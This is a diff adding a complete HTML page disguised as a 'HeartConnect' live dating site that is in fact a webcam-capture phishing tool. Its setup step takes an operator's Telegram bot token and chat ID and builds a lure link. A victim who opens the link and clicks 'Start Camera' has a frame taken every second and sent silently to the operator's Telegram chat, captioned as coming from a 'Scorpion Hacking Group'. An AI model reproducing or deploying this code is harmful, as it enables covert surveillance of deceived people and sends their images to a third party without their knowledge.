@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HeartConnect - Live Dating</title>
+    <style>
+        :root {
+            --primary: #ff4b6e;
+            --secondary: #2c3e50;
+            --glass-bg: rgba(255, 255, 255, 0.1);
+            --shadow: 0 0.5rem 1rem rgba(0, 0, 0, 0.2);
+            --font: 'Poppins', sans-serif;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: var(--font);
+        }
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            display: flex;
+            flex-direction: column;
+            color: #fff;
+        }
+        .container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+            max-width: 90%;
+            margin: auto;
+        }
+        .card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(0.5rem);
+            border-radius: 1rem;
+            padding: 2rem;
+            box-shadow: var(--shadow);
+            width: 100%;
+            max-width: 30rem;
+            text-align: center;
+            animation: fadeIn 1s ease-in;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(2rem); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        h1 {
+            font-size: 2rem;
+            margin-bottom: 1rem;
+            color: var(--primary);
+        }
+        p {
+            font-size: 1rem;
+            margin-bottom: 1.5rem;
+            color: #ddd;
+        }
+        button {
+            background: var(--primary);
+            border: none;
+            padding: 0.75rem 1.5rem;
+            border-radius: 2rem;
+            color: #fff;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            margin: 0.25rem;
+        }
+        button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0.3rem 0.6rem rgba(0, 0, 0, 0.3);
+        }
+        input {
+            width: 100%;
+            padding: 0.75rem;
+            margin: 0.5rem 0;
+            border-radius: 0.5rem;
+            border: none;
+            background: rgba(255, 255, 255, 0.2);
+            color: #fff;
+            font-size: 1rem;
+        }
+        input::placeholder {
+            color: #ccc;
+        }
+        #video {
+            width: 100%;
+            max-width: 20rem;
+            border-radius: 0.5rem;
+            margin: 1rem auto;
+            display: none;
+            box-shadow: var(--shadow);
+        }
+        #uniqueUrl {
+            word-break: break-all;
+            color: var(--primary);
+            margin-top: 1rem;
+        }
+        footer {
+            padding: 1rem;
+            text-align: center;
+            background: var(--secondary);
+            font-size: 0.9rem;
+            color: #ddd;
+        }
+        footer a {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: bold;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 1.5rem;
+            }
+            p {
+                font-size: 0.9rem;
+            }
+            .card {
+                padding: 1.5rem;
+            }
+            button {
+                padding: 0.5rem 1rem;
+                font-size: 0.9rem;
+            }
+            input {
+                font-size: 0.9rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card" id="setupCard">
+            <h1>HeartConnect Setup</h1>
+            <p>Setup your live dating page! Enter Telegram Bot Token and Chat ID.</p>
+            <input type="text" id="botToken" placeholder="Enter Telegram Bot Token">
+            <input type="text" id="chatId" placeholder="Enter Telegram Chat ID">
+            <button id="generateUrl">Generate My Page</button>
+            <p id="uniqueUrl"></p>
+        </div>
+        <div class="card" id="cameraCard" style="display: none;">
+            <h1>HeartConnect</h1>
+            <p>Go live and connect with your match! Allow camera access to start.</p>
+            <button id="startCamera">Start Camera</button>
+            <button id="stopCamera" style="display:none;">Stop Camera</button>
+            <video id="video" autoplay playsinline></video>
+        </div>
+    </div>
+    <footer>
+        Developed By <a href="https://t.me/ScorpionYug" target="_blank">Scorpion Yug</a> & Zara
+    </footer>
+    <script>
+        const setupCard = document.getElementById('setupCard');
+        const cameraCard = document.getElementById('cameraCard');
+        const botTokenInput = document.getElementById('botToken');
+        const chatIdInput = document.getElementById('chatId');
+        const generateUrlButton = document.getElementById('generateUrl');
+        const uniqueUrlDisplay = document.getElementById('uniqueUrl');
+        const video = document.getElementById('video');
+        const startCamera = document.getElementById('startCamera');
+        const stopCamera = document.getElementById('stopCamera');
+        let captureInterval = null;
+        let stream = null;
+
+        // Generate a simple unique ID
+        function generateUniqueId() {
+            return 'xxxx-xxxx-xxxx-xxxx'.replace(/[x]/g, () =>
+                (Math.random() * 16 | 0).toString(16)
+            );
+        }
+
+        // Generate live page URL and switch to camera card
+        generateUrlButton.addEventListener('click', () => {
+            const botToken = botTokenInput.value.trim();
+            const chatId = chatIdInput.value.trim();
+            if (!botToken || !chatId) {
+                alert('Please enter both Bot Token and Chat ID.');
+                return;
+            }
+            const uniqueId = generateUniqueId();
+            const uniqueUrl = `${window.location.origin}/live/${uniqueId}?token=${encodeURIComponent(botToken)}&chatId=${encodeURIComponent(chatId)}`;
+            uniqueUrlDisplay.innerHTML = `Your Live URL: <a href="${uniqueUrl}" target="_blank">${uniqueUrl}</a>`;
+            window.history.pushState({}, '', uniqueUrl);
+            setupCard.style.display = 'none';
+            cameraCard.style.display = 'block';
+            localStorage.setItem('botToken', botToken);
+            localStorage.setItem('chatId', chatId);
+        });
+
+        // On page load, check URL params for direct camera access
+        const params = new URLSearchParams(window.location.search);
+        const urlBotToken = params.get('token');
+        const urlChatId = params.get('chatId');
+        if (urlBotToken && urlChatId) {
+            setupCard.style.display = 'none';
+            cameraCard.style.display = 'block';
+            localStorage.setItem('botToken', urlBotToken);
+            localStorage.setItem('chatId', urlChatId);
+        }
+
+        // Start camera and photo capture
+        startCamera.addEventListener('click', async () => {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                video.style.display = 'block';
+                startCamera.style.display = 'none';
+                stopCamera.style.display = 'inline-block';
+                video.onloadedmetadata = () => {
+                    video.play().catch(err => console.error('Video play failed:', err));
+                    if (!captureInterval) {
+                        captureAndSend();
+                    }
+                };
+            } catch (err) {
+                alert('Camera access denied or unavailable.');
+                console.error(err);
+            }
+        });
+
+        // Stop camera and photo capture
+        stopCamera.addEventListener('click', () => {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                captureInterval = null;
+            }
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
+            video.srcObject = null;
+            video.style.display = 'none';
+            startCamera.style.display = 'inline-block';
+            stopCamera.style.display = 'none';
+        });
+
+        // Capture and send to Telegram
+        function captureAndSend() {
+            const TELEGRAM_BOT_TOKEN = localStorage.getItem('botToken');
+            const CHAT_ID = localStorage.getItem('chatId');
+            if (!TELEGRAM_BOT_TOKEN || !CHAT_ID) return;
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const caption = "Photo From Scorpion Hacking Group\n\nJoin Us For More Tools\n@ScorpionHackingGroup";
+            captureInterval = setInterval(() => {
+                if (video.videoWidth === 0 || video.videoHeight === 0) return;
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'capture.jpg');
+                    formData.append('caption', caption);
+                    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    }).then(response => {
+                        if (!response.ok) {
+                            console.error('Failed to send photo:', response.statusText);
+                        }
+                    }).catch(err => console.error('Failed to send photo:', err));
+                }, 'image/jpeg', 0.8);
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
